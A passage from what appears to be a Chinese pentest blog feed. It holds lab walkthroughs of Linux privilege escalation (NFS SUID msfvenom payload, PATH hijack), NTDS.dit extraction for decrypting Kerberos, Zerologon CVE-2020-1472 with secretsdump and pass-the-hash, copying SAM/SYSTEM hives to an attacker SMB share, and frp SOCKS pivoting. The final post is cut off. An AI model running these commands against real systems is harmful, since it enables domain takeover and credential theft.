class="line">rootbash-4.1<span class="comment"># </span></span><br><span class="line">rootbash-4.1<span class="comment"># id</span></span><br><span class="line">uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)</span><br><span class="line"></span><br><span class="line">rm /tmp/rootbash  <span class="comment">#请记住删除修改后的代码，删除 /tmp/rootbash 可执行文件并退出提升的 shell，然后再继续，因为稍后您将在房间中再次创建此文件！</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><hr><h3 id="8-NFS"><a href="#8-NFS" class="headerlink" title="#8 NFS"></a>#8 NFS</h3><p>网络文件系统：网络文件系统允许客户端计算机上的用户通过网络挂载共享文件或目录。NFS使用远程过程调用（RPC）在客户端和服务器之间路由请求。</p><p>目标机开启了/tmp共享</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ cat /etc/exports</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/612199c3359bec53f0b5ada64da87c30.png" alt="image-20220518175200970"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ showmount -e 10.10.109.232</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/dad20bdd1df9f4de5c790886d6dcd056.png" alt="image-20220519101446347"></p><p>漏洞利用(攻击机)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir /tmp/nfs<span class="comment">#创建文件夹</span></span><br><span class="line">$ mount -o rw,vers=2 10.10.63.222:/tmp /tmp/nfs<span class="comment">#挂载目录，IP是目标机</span></span><br><span class="line">$ msfvenom -p linux/x86/<span class="built_in">exec</span> CMD=<span class="string">&quot;/bin/bash -p&quot;</span> -f elf -o /tmp/nfs/shell.elf<span class="comment">#生成exploit</span></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 48 bytes</span><br><span class="line">Final size of elf file: 132 bytes</span><br><span class="line">Saved as: /tmp/nfs/shell.elf</span><br><span class="line"></span><br><span class="line">$ chmod +xs /tmp/nfs/shell.elf<span class="comment">#添加执行权限</span></span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/bb2661aa8b515535055df39a6d9dd51c.png" alt="image-20220518175454810"></p><p>目标机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">user@debian:/tmp$ ls</span><br><span class="line">backup.tar.gz  root.pm  shell  shell2  shell2.c  shell.c  shell.elf  useless</span><br><span class="line">user@debian:/tmp$ /tmp/shell.elf<span class="comment">#执行exploit</span></span><br><span class="line">bash-4.1<span class="comment"># id</span></span><br><span class="line">uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)</span><br><span class="line">bash-4.1<span class="comment"># ls /root</span></span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/f0cf3e5b659e94bffb96cc96371faece.png" alt="image-20220518175559457"></p><hr><h3 id="9-PATH变量"><a href="#9-PATH变量" class="headerlink" title="#9 PATH变量"></a>#9 PATH变量</h3><p>echo $PATH</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">user5@polobox:~$ ./script    <span class="comment">#脚本执行的ls命令</span></span><br><span class="line">Desktop  Documents  Downloads  Music  PicturesPublicscriptTemplates  Videos</span><br><span class="line">user5@polobox:~$ <span class="built_in">echo</span> <span class="string">&quot;/bin/bash&quot;</span> &gt; /tmp/ls      <span class="comment">#在/tmp目录下生成一个替换的ls命令</span></span><br><span class="line">user5@polobox:~$ chmod +x /tmp/ls<span class="comment">#添加执行权限</span></span><br><span class="line">user5@polobox:~$ <span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span><span class="comment">#修改环境变量为/tmp</span></span><br><span class="line">user5@polobox:~$ ./script<span class="comment">#执行脚本弹回</span></span><br><span class="line">Welcome to Linux Lite 4.4 user5</span><br><span class="line"> </span><br><span class="line">Tuesday 17 May 2022, 05:05:26</span><br><span class="line">Memory Usage: 364/1991MB (18.28%)</span><br><span class="line">Disk Usage: 6/217GB (3%)</span><br><span class="line">Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)</span><br><span class="line"> </span><br><span class="line">root@polobox:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1004(user5)</span><br></pre></td></tr></table></figure><hr><p>参考文章：</p><ul><li><a href="https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md">https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md</a></li><li>[<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md]">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md]</a>(<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology</a> and Resources/Linux - Privilege Escalation.md)</li><li><a href="https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html">https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation__-_linux.html</a></li><li><a href="https://payatu.com/guide-linux-privilege-escalation">https://payatu.com/guide-linux-privilege-escalation</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;0-枚举脚本&quot;&gt;&lt;a href=&quot;#0-枚举脚本&quot; class=&quot;headerlink&quot; title=&quot;#0 枚举脚本&quot;&gt;&lt;/a&gt;#0 枚举脚本&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;linpeas.sh：&lt;/strong&gt;&lt;a href=&quot;https://github.</summary>
      
    
    
    
    
    <category term="提权" scheme="https://z4ynadmin.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>解密Wireshark Kerberos协议</title>
    <link href="https://z4ynadmin.github.io/2022/11/07/%E8%A7%A3%E5%AF%86Wireshark-Kerberos%E5%8D%8F%E8%AE%AE/"/>
    <id>https://z4ynadmin.github.io/2022/11/07/%E8%A7%A3%E5%AF%86Wireshark-Kerberos%E5%8D%8F%E8%AE%AE/</id>
    <published>2022-11-07T06:50:26.000Z</published>
    <updated>2022-11-07T06:59:08.926Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-原始报文"><a href="#1-原始报文" class="headerlink" title="#1 原始报文"></a>#1 原始报文</h3><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/61e61014277a2683611a32ab5cac7a31.png" alt="image-20220908162617609"></p><h3 id="2-域控导出NTDS-dit和SYSTEM文件"><a href="#2-域控导出NTDS-dit和SYSTEM文件" class="headerlink" title="#2 域控导出NTDS.dit和SYSTEM文件"></a>#2 域控导出NTDS.dit和SYSTEM文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vssadmin create shadow /<span class="keyword">for</span>=C:</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ntds.dit</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system.hive</span><br><span class="line">vssadmin delete shadows /all</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/d66f5857b61f15723e33afdcd5213463.png" alt="image-20220908162947619"></p><h3 id="3-kali安装-libesedb-utils"><a href="#3-kali安装-libesedb-utils" class="headerlink" title="#3 kali安装 libesedb-utils"></a>#3 kali安装 libesedb-utils</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt <span class="keyword">install</span> libesedb-utils</span><br></pre></td></tr></table></figure><h3 id="4-git-克隆-ntdsxtract"><a href="#4-git-克隆-ntdsxtract" class="headerlink" title="#4 git 克隆 ntdsxtract"></a>#4 git 克隆 ntdsxtract</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/csababarta/ntdsxtract.git</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/c95f93fce535f8dd4a118dcfbd6c845d.png" alt="image-20220908164711048"></p><h3 id="5-python2-安装-pycryptodome"><a href="#5-python2-安装-pycryptodome" class="headerlink" title="#5 python2 安装 pycryptodome"></a>#5 python2 安装 pycryptodome</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -m pip <span class="keyword">install</span> pycryptodome</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/c6825d7e4ef926a122fadb194c9ee5d4.png" alt="image-20220908163452363"></p><h3 id="6-提取出多个文件，在ntds-dit-export目录下-这个步骤等待的时间较长"><a href="#6-提取出多个文件，在ntds-dit-export目录下-这个步骤等待的时间较长" class="headerlink" title="#6 提取出多个文件，在ntds.dit.export目录下  (这个步骤等待的时间较长)"></a>#6 提取出多个文件，在ntds.dit.export目录下  <strong>(这个步骤等待的时间较长)</strong></h3><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/11117420d4fa5afa32fc314c3014a20c.png" alt="image-20220908163632883"></p><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/e25c82cdcf4c7066ce0df15edb81d62f.png" alt="image-20220908164504631"></p><h3 id="7-提取出-keytab文件"><a href="#7-提取出-keytab文件" class="headerlink" title="#7 提取出 keytab文件"></a>#7 提取出 keytab文件</h3><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/45617889359798fc34465d860c4a1a55.png" alt="image-20220908164816450"></p><h3 id="8-Wireshark-导入keytab文件-编辑-gt-首选项-gt-Protocols-gt-KRB5"><a href="#8-Wireshark-导入keytab文件-编辑-gt-首选项-gt-Protocols-gt-KRB5" class="headerlink" title="#8 Wireshark 导入keytab文件  编辑-&gt;首选项-&gt;Protocols-&gt;KRB5"></a>#8 Wireshark 导入keytab文件  编辑-&gt;首选项-&gt;Protocols-&gt;KRB5</h3><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/81e818b81cc454398a7bac9019ae6b18.png" alt="image-20220908164946014" style="zoom:33%;" /><h3 id="9-解密enc-part部分，就能看到-Login-session-key。"><a href="#9-解密enc-part部分，就能看到-Login-session-key。" class="headerlink" title="#9 解密enc-part部分，就能看到 Login session key。"></a>#9 解密enc-part部分，就能看到 Login session key。</h3><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/531a7ef9dbdd758a6631f5d0265a5cb9.png" alt="image-20220908165522558"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;1-原始报文&quot;&gt;&lt;a href=&quot;#1-原始报文&quot; class=&quot;headerlink&quot; title=&quot;#1 原始报文&quot;&gt;&lt;/a&gt;#1 原始报文&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://z4admin.s3.ap-northeast-1.amazonaw</summary>
      
    
    
    
    
    <category term="Kerberos" scheme="https://z4ynadmin.github.io/tags/Kerberos/"/>
    
    <category term="Wireshark" scheme="https://z4ynadmin.github.io/tags/Wireshark/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-1472 Netlogon权限提升</title>
    <link href="https://z4ynadmin.github.io/2022/11/07/CVE-2020-1472-Netlogon%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    <id>https://z4ynadmin.github.io/2022/11/07/CVE-2020-1472-Netlogon%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</id>
    <published>2022-11-07T06:27:44.000Z</published>
    <updated>2022-11-07T06:41:38.882Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-目录"><a href="#0x00-目录" class="headerlink" title="# 0x00 目录"></a># 0x00 目录</h3><ol><li>漏洞分析</li><li>漏洞利用条件</li><li>漏洞利用</li></ol><hr><h3 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="# 0x01 漏洞分析"></a># 0x01 漏洞分析</h3><p>攻击者在通过NetLogon ( MS-NRPC)协议与AD域控建立安全通道时，可利用该漏洞将AD域控的计算机账号密码置为空，从而控制域控服务器。Netlogon使用的AES认证算法中的vi向量默认为o，导致攻击者可以绕过认证，可以向域发起Netlogon计算机账户认证请求,使用8字节全0 client challenge不断尝试得到一个正确的8字节全O client credential通过认证，再通过相关调用完成对域控密码的修改。</p><p>影响版本</p><ul><li>Windows Server 2008 R2 for x64-based Systems Service Pack 1</li><li>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</li><li>Windows Server 2012</li><li>Windows Server 2012 (Server Core installation)</li><li>Windows Server 2012 R2</li><li>Windows Server 2012 R2 (Server Core installation)</li><li>Windows Server 2016</li><li>Windows Server 2016 (Server Core installation)</li><li>Windows Server 2019</li><li>Windows Server 2019 (Server Core installation)</li><li>Windows Server, version 1903 (Server Core installation)</li><li>Windows Server, version 1909 (Server Core installation)</li><li>Windows Server, version 2004 (Server Core installation)</li></ul><hr><h3 id="0x02-漏洞利用条件"><a href="#0x02-漏洞利用条件" class="headerlink" title="# 0x02 漏洞利用条件"></a># 0x02 漏洞利用条件</h3><ol><li>与域控通讯（在不在域内都行）</li><li>能访问域控MS-NRPC服务，</li></ol><p>当攻击者使用Netlogon远程协议(MS-NRPC)建立与域控制器连接的易受攻击的 Netlogon安全通道时，存在特权提升漏洞。成功利用此漏洞的攻击者可以在网络中的设备上运行经特殊设计的应用程序。</p><p>要利用此漏洞，未通过身份验证的攻击者需要将MS-NRPC连接到域控制器，以获取域管理员访问权限。</p><hr><h3 id="0x03-复现工具"><a href="#0x03-复现工具" class="headerlink" title="# 0x03 复现工具"></a># 0x03 复现工具</h3><p>漏洞验证工具：<a href="https://github.com/SecuraBV/CVE-2020-1472/blob/master/zerologon_tester.py">https://github.com/SecuraBV/CVE-2020-1472/blob/master/zerologon_tester.py</a></p><p>漏洞利用工具：<a href="https://github.com/risksense/zerologon/blob/master/set_empty_pw.py">https://github.com/risksense/zerologon/blob/master/set_empty_pw.py</a></p><p>密码重置工具：<a href="https://github.com/risksense/zerologon/blob/master/reinstall_original_pw.py">https://github.com/risksense/zerologon/blob/master/reinstall_original_pw.py</a></p><h3 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="# 0x04 漏洞复现"></a># 0x04 漏洞复现</h3><h4 id="0-漏洞验证脚本"><a href="#0-漏洞验证脚本" class="headerlink" title="0). 漏洞验证脚本"></a>0). 漏洞验证脚本</h4><p>获取dc主机名</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Windows：nbtstat -<span class="keyword">A</span> <span class="number">10.10.10.8</span></span><br><span class="line">Linux：nbtscan</span><br></pre></td></tr></table></figure><p>漏洞验证工具：zerologon_tester.py</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python3</span> zerologon_tester.py OWA <span class="number">10.10.10.8</span></span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/ad4c8bc4c00f7fcc8539b0c6d69f6107.png" alt="image-20220810131156397"></p><h4 id="1-更改dc密码为空"><a href="#1-更改dc密码为空" class="headerlink" title="1).  更改dc密码为空"></a>1).  更改dc密码为空</h4><p>利用set_empty_pw.py将dc密码设置为空，即<code>31d6cfe0d16ae931b73c59d7e0c089c0</code>在利用secretsdump.py读dc的hash</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python3</span> set_empty_pw.py OWA <span class="number">10.10.10.8</span>  <span class="comment">#OWA为域控主机名</span></span><br><span class="line">impacket-secretsdump redteam.red/OWA\$@<span class="number">10.10.10.8</span> -<span class="literal">no</span>-pass</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/4a7a9f5050bc6d5e2c012d25e94ddb30.png" alt="image-20220810133549444"></p><p>获取到域管理员administrator用户hash：redteam.red\Administrator:500:aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4:::</p><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/0deb21948f62266afccca6532636e63c.png" alt="image-20220810152925651"></p><p>pth登录</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">impacket</span>-wmiexec redteam.red/Administrator@<span class="number">10.10.10.8</span> -hashes :<span class="number">579</span>da<span class="number">618</span>cfbfa<span class="number">85247</span>acf<span class="number">1</span>f<span class="number">800</span>a<span class="number">280</span>a<span class="number">4</span> -codec gb<span class="number">2312</span></span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/5ab8efe26779c0c580977b9d345a4d50.png" alt="image-20220810162528929"></p><p><strong>因为密码置空后，用户在 AD 中的密码（ntds.dic）与本地的注册表 /lsass 里面的密码不一致，会脱离域控，所以要将其恢复</strong>。</p><h4 id="2-还原密码"><a href="#2-还原密码" class="headerlink" title="2).  还原密码"></a>2).  还原密码</h4><h4 id="1-第一种方法"><a href="#1-第一种方法" class="headerlink" title="#1 第一种方法"></a>#1 第一种方法</h4><p>密码还原工具restorepassword.py：<a href="https://raw.githubusercontent.com/dirkjanm/CVE-2020-1472/master/restorepassword.py">https://raw.githubusercontent.com/dirkjanm/CVE-2020-1472/master/restorepassword.py</a></p><p>利用plain_password_hex</p><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/5c3a8ee428689c54755d1ca0dd3c9525.png" alt="image-20220810143125888"></p><p>用restorepassword.py将密码还原，还原后利用空口令登录失败</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 restorepassword.py redteam.red/owa@owa -target-ip 10.10.10.8 -hexpass 595ee95117c30b874201c95971f38dd5ae0a97a564a70a366977619ea5cb3e3f18f4a4e9f3d99ec0e676e2a75594afec2ad567081ac566b118c7941e1e247a4855dd3c50edb5ed236e5cc17cf7336deb6291183f034dad603d1f475228f6d39cbea07b85335c85c554071bfa9fbc45c0f036e21e25da514c272e92db7e160d46aa1b298539cfa5f5c83773a9901983443c999e2750972f5aca71461217ecf84c7fdaca9deb1ca0000e88a587ea3aea6183db82ed5f9e66603568c2708f395e3ed96997254a8dd25b5afc06dd52c52f25e063d7b782cfa2e40667eb2bc2a4b0830f1199db0b4b4ef9ab599f983a18a567</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/aad8f7c2a28fe1f0f0ae1f0525bdc8d2.png" alt="image-20220810143023360"></p><h4 id="2-第二种方法"><a href="#2-第二种方法" class="headerlink" title="#2 第二种方法"></a>#2 第二种方法</h4><p>从注册表/lsass里面读取机器用户原先的密码，恢复AD里面的密码</p><p>利用redteam.red/administrator hash登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-wmiexec redteam.red/Administrator@10.10.10.8 -hashes :579da618cfbfa85247acf1f800a280a4 -codec gb2312</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/903fb9e42a3015d99e4cca47e86eeccc.png" alt="image-20220810153151365"></p><p>读取sam、system、security文件</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">reg</span> <span class="keyword">save</span> hklm\sam sam.hive</span><br><span class="line"><span class="keyword">reg</span> <span class="keyword">save</span> hklm\system system.hive</span><br><span class="line"><span class="keyword">reg</span> <span class="keyword">save</span> hklm\security security.hive</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/acaa94a386ea3d32f427090193558e16.png" alt="image-20220810153451987"></p><p>通过SMB share复制回攻击机</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="symbol">\&gt;</span>copy sam.hive <span class="symbol">\\</span>10.10.10.128<span class="symbol">\s</span>hare<span class="symbol">\s</span>am.hive</span><br><span class="line">已复制         1 个文件。</span><br><span class="line"></span><br><span class="line">C:<span class="symbol">\&gt;</span>copy security.hive <span class="symbol">\\</span>10.10.10.128<span class="symbol">\s</span>hare<span class="symbol">\s</span>ecurity.hive</span><br><span class="line">已复制         1 个文件。</span><br><span class="line"></span><br><span class="line">C:<span class="symbol">\&gt;</span>copy system.hive <span class="symbol">\\</span>10.10.10.128<span class="symbol">\s</span>hare<span class="symbol">\s</span>ystem.hive</span><br><span class="line">已复制         1 个文件。</span><br><span class="line"></span><br><span class="line">C:<span class="symbol">\&gt;</span>exit</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/cc093d005f3aedfa5facda684b6cd700.png" alt="image-20220810153845364"></p><p>或者利用impacket-smbclient链接到smb将文件下载到本地。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">impacket</span>-smbclient redteam.red/administrator@<span class="number">10.10.10.8</span> -hashes :<span class="number">579</span>da<span class="number">618</span>cfbfa<span class="number">85247</span>acf<span class="number">1</span>f<span class="number">800</span>a<span class="number">280</span>a<span class="number">4</span></span><br><span class="line"><span class="comment"># use c$</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line"><span class="comment"># get sam.hive</span></span><br><span class="line"><span class="comment"># get security.hive</span></span><br><span class="line"><span class="comment"># get system.hive</span></span><br><span class="line"><span class="comment"># exit</span></span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/b905ef8ec45562a91c609ac83ae2d1d9.png" alt="image-20220810154730324"></p><p>利用secretsdump 读取到hash</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.hive  -<span class="keyword">system</span> <span class="keyword">system</span>.hive  -<span class="keyword">security</span> <span class="keyword">security</span>.hive <span class="keyword">LOCAL</span></span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/2ae82be519b899cab986509040e36729.png" alt="image-20220810160422687"></p><p>利用reinstall_original_pw.py将密码恢复。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python3</span> reinstall_original_pw.py owa <span class="number">10.10.10.8</span> <span class="number">4</span>e<span class="number">4890</span>dbf<span class="number">2</span>da<span class="number">33</span>f<span class="number">3</span>ce<span class="number">4087</span>f<span class="number">5</span>dd<span class="number">6</span>a<span class="number">4</span>dba</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/29a737488a1edfa98f9ad7bc71775279.png" alt="image-20220810160619182"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;0x00-目录&quot;&gt;&lt;a href=&quot;#0x00-目录&quot; class=&quot;headerlink&quot; title=&quot;# 0x00 目录&quot;&gt;&lt;/a&gt;# 0x00 目录&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;漏洞分析&lt;/li&gt;
&lt;li&gt;漏洞利用条件&lt;/li&gt;
&lt;li&gt;漏洞利用&lt;/li&gt;
</summary>
      
    
    
    
    
    <category term="CVE-2020-1472" scheme="https://z4ynadmin.github.io/tags/CVE-2020-1472/"/>
    
  </entry>
  
  <entry>
    <title>frp之一层网络代理 / 二层网络代理 / 三层网络代理</title>
    <link href="https://z4ynadmin.github.io/2022/11/04/frp%E4%B9%8B%E4%B8%80%E5%B1%82%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%20%20%E4%BA%8C%E5%B1%82%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%20%20%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/"/>
    <id>https://z4ynadmin.github.io/2022/11/04/frp%E4%B9%8B%E4%B8%80%E5%B1%82%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%20%20%E4%BA%8C%E5%B1%82%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%20%20%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/</id>
    <published>2022-11-04T03:05:00.000Z</published>
    <updated>2022-11-07T06:43:04.270Z</updated>
    
    <content type="html"><![CDATA[<h1 id="frp之一层网络代理-二层网络代理-三层网络代理"><a href="#frp之一层网络代理-二层网络代理-三层网络代理" class="headerlink" title="frp之一层网络代理 / 二层网络代理 / 三层网络代理"></a>frp之一层网络代理 / 二层网络代理 / 三层网络代理</h1><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/9a8daaf9a97e19adb4eb2e2aed0f0724.png" alt="image-20221103155324246"></p><h3 id="一层网络代理"><a href="#一层网络代理" class="headerlink" title="# 一层网络代理"></a># 一层网络代理</h3><p>获取10.10.10.13 Web服务器权限后搭建frp扫描DMZ区内主机。</p><ol><li>使用VPS作为FRP服务端，在VPS上执行：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frps.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0    <span class="comment"># 在服务端上绑定的IP地址</span></span><br><span class="line">bind_port = 7000       <span class="comment"># 在服务端上绑定的端口</span></span><br></pre></td></tr></table></figure><ol start="2"><li>用Windows Server 2012作为客户端</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.\frpc.exe -c .\frpc.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frpc.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.2.200    <span class="comment"># 指向frp服务端绑定的ip地址</span></span><br><span class="line">server_port = 7000             <span class="comment"># 指向frp服务端绑定的端口</span></span><br><span class="line">[socks5]</span><br><span class="line">remote_port = 1080             <span class="comment"># 代理所使用的端口，会被转发到服务器</span></span><br><span class="line">plugin = socks5                <span class="comment"># 代理的类型</span></span><br></pre></td></tr></table></figure><ol start="3"><li>编辑proxychains4的配置文件：/etc/proxychains4.conf </li></ol><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/b897624a4285bd1d9040d74d16ad340a.png" alt="image-20221103171204998"></p><ol start="4"><li>命令前加上proxychains4</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychinas4 ssh root@10.10.10.15</span><br></pre></td></tr></table></figure><hr><h3 id="二层网络代理"><a href="#二层网络代理" class="headerlink" title="# 二层网络代理"></a># 